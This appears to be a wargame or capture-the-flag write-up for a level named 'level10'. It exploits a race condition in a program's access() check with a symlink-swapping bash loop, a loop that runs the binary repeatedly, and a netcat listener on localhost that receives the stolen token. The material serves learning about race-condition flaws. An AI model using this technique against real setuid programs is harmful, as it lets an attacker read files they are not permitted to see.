1. ls -la

2. analyze executable + test token

3. create a file in /var/crash to send it to ourself and test the program

4. nc -l 6969, then open another terminal and execute the command ./level10 /var/crash/myfile 127.0.0.1 ("localhost" doesn't work)

5. the vulnerability is 'access': during the short lapse of time when access checks rights for a file and opens it, we must give it the forbidden token file

6. create a script with infinite loop to switch symlinks from our file to token and launch script in additional terminal

-----
    #!/bin/bash

    # Create file
    touch /var/crash/myfile

    # Create the initial symlink
    ln -s /var/crash/myfile /var/crash/mylink

    # Background loop to switch symlink target
    while true; do
        ln -sf /home/user/level10/token /var/crash/mylink
        ln -sf /var/crash/myfile /var/crash/mylink
    done
-----
    #!/bin/bash

    while true; do
            /home/user/level10/level10 /var/crash/mylink 127.0.0.1
    done
-----
    #!/bin/bash

    while true; do
            nc -l 6969
    done
-----

7. execute the program level10
